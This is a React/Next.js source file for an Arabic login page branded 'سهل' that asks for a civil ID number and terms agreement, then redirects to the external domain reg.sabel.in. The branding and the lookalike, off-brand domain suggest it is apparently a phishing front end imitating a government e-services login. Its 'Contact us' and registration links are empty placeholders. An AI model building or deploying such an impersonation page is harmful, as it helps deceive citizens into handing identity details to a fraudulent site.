'use client';

import type React from 'react';

import { useState } from 'react';
import Link from 'next/link';
import { MessageSquare } from 'lucide-react';
import { useRouter } from 'next/navigation';
export default function ArabicLoginPage() {
  const [civilNumber, setCivilNumber] = useState('');
  const [agreeToTerms, setAgreeToTerms] = useState(false);
  const router = useRouter();
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Handle form submission logic here
    router.push('https://reg.sabel.in/');
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-start pt-10 px-4">
        {/* Logo */}
        <div className="flex flex-col items-center mb-10">
          <div className="flex mb-2">
            <div className="w-16 h-16 bg-blue-900 transform rotate-45 -mr-4"></div>
            <div className="w-16 h-16 bg-blue-700 transform rotate-45 -mr-4"></div>
            <div className="w-16 h-16 bg-blue-500 transform rotate-45"></div>
          </div>
          <div
            className="mt-6 text-blue-900 text-6xl font-bold"
          >
            سهل
          </div>
        </div>

        {/* Form */}
        <form
          onSubmit={handleSubmit}
          className="w-full max-w-md flex flex-col items-center"
        >
          {/* Civil Number Input */}
          <div className="w-full mb-6">
            <input
              type="text"
              value={civilNumber}
              onChange={(e) => setCivilNumber(e.target.value)}
              placeholder="أدخل الرقم المدني"
              className="w-full px-4 py-3 text-right rounded-full border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
              dir="rtl"
              required
              minLength={9}
              maxLength={12}
            />
          </div>

          {/* Terms Checkbox */}
          <div className="w-full flex justify-end mb-6">
            <label className="flex items-center gap-2 text-right">
              <input
                type="checkbox"
                checked={agreeToTerms}
                onChange={(e) => setAgreeToTerms(e.target.checked)}
                className="w-5 h-5"
                required
              />
              <span className="text-sm" dir="rtl">
                أوافق على الشروط والأحكام
              </span>
            </label>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            className="w-full py-3 px-4 bg-blue-500 text-gray-100 rounded-full font-medium mb-6"
            disabled={!agreeToTerms && civilNumber.length > 9 }
          >
            <span dir="rtl">تسجيل الدخول</span>
          </button>

          {/* Links */}
          <div className="w-full flex justify-between text-sm text-blue-600 mt-4">
            <Link href="#" className="text-right">
              <span dir="rtl">اتصل بنا</span>
            </Link>
            <Link href="#" className="text-right">
              <span dir="rtl">خطوات التسجيل</span>
            </Link>
          </div>
        </form>
      </div>

      {/* Chat Widget */}
    </div>
  );
}
